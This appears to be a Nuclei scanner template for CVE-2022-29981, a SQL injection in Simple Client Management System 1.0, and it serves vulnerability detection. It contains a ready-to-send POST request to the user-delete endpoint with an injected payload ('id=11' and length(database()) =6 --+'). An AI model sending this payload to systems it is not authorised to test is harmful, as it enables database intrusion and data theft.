id: CVE-2022-29981

info:
  name: SQL Injection in Simple Client Management System
  author: ProjectDiscoveryAI
  severity: critical
  description: Simple Client Management System 1.0 is vulnerable to SQL Injection via /cms/classes/Users.php?f=delete.
  impact: |
    Allows attackers to execute arbitrary SQL queries and potentially gain unauthorized access to the database.
  remediation: |
    Implement input validation and use parameterized queries to prevent SQL Injection attacks.

http:
  - method: POST
    path:
      - "{{BaseURL}}/cms/classes/Users.php?f=delete"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
      Accept: application/json, text/javascript, */*; q=0.01
      Referer: "{{BaseURL}}/cms/admin/?page=user/list"
      Origin: "{{BaseURL}}"
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
      Cookie: PHPSESSID=5u3dthmlo3ajo2g7k8pfvb4g8h
      Connection: close

    body: "id=11' and length(database()) =6 --+"
    matchers:
      - type: word
        part: header
        words:
          - "Content-Length: 19"
